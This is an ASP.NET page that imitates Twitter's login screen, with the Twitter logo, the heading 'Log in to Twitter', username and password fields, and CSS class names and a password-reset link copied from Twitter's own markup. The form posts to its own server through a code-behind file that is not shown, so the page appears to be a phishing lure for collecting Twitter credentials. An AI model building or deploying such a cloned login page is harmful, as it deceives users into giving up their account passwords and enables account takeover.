<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="_Default" %>

<!DOCTYPE html>

<head>
    <style type="text/css">
        .auto-style1 {
            text-align: center;
        }
        .auto-style2 {
            font-size: medium;
        }
        #Text1 {
            width: 300px;
            height: 40px;
        }
        .auto-style3 {
            font-size: medium;
            color: #3399FF;
        }
        .auto-style4 {
            color: #3399FF;
        }
    </style>
</head>

<div class="container">
    <form id="form1" runat="server">
    <div class="row">
      <h2 style="text-align:center">&nbsp;</h2>
        <h2 style="text-align:center">
            <asp:Image ID="Image1" runat="server" Height="78px" ImageUrl="~/image/twitter logo.jpg" style="text-align: center" Width="108px" />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </h2>
        <h2 style="text-align:center">
            Log in to Twitter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</h2>
        <div class="auto-style1">
            <div class="auto-style1">
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />
                <input id="Text1" name="Phone,Email or Username" placeholder="Phone,Email or Username" type="text" />&nbsp;
                <br />
                <br />
                <input type="password" name="password" placeholder="Password" required style="width: 300px; height: 40px"><br />
                <br />
                <br />
&nbsp;<input type="submit" value="Log in" style="width: 155px; font-size: x-large; height: 51px; color: #FFFFFF; font-family: 'Arial Rounded MT Bold'; z-index: 1; background-color: #0099FF">
                <br />
                <br />
                <br />
        </div>
      </div>

    </div>
    </form>
    <div class="row">
        <div class="auto-style1">
            <span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0" style="border: 0px solid black; box-sizing: border-box; color: inherit; display: inline; font: inherit; margin: 0px; padding: 0px; white-space: inherit; overflow-wrap: break-word; min-width: 0px;">
            <a class="auto-style2" href="https://twitter.com/account/begin_password_reset" role="link" style="cursor: pointer; background-color: rgb(255, 255, 255); color: rgb(27, 149, 224); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-weight: 400; font-stretch: inherit; line-height: inherit; list-style: none; margin: 0px; text-align: left; text-decoration: none; border: 0px solid black; box-sizing: border-box; display: inline; padding: 0px; white-space: pre-wrap; overflow-wrap: break-word; min-width: 0px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">Forgot password?</a></span><span class="auto-style3"> </span><span class="auto-style4">Sign up for Twitter</span><br />
        </div>
        <div class="col">
            <a href="#" style="color:white" class="btn">Forgot password?</a>
        </div>
    </div>
</div>
